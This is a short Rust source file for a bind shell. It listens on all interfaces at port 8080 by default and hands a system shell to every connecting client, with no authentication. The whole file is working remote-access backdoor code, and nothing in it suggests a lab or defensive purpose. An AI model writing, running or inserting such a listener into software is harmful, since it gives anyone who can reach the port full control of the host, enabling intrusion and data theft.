use std::net::{TcpListener, TcpStream};
use std::io;
use std::env;

use  net_utils::net_mini::net_mini_shell::spawn_system_shell;

fn main() -> io::Result<()> {
    let args: Vec<String> = env::args().collect();
    let address: String = env::var("LISTENER_ADDRESS").unwrap_or_else(|_| "0.0.0.0:8080".to_string());

    eprintln!("(listener) Listening on {}", address);
    let listener = TcpListener::bind(address)?;

    loop {
        let (mut stream, remote) = listener.accept()?;
        eprintln!("(listener) Connection from {:?}", remote);

        match spawn_system_shell(&mut stream) {
            Ok(_) => eprintln!("(listener) Shell session ended."),
            Err(e) => eprintln!("(listener) Error: {}", e),
        }
    }
}
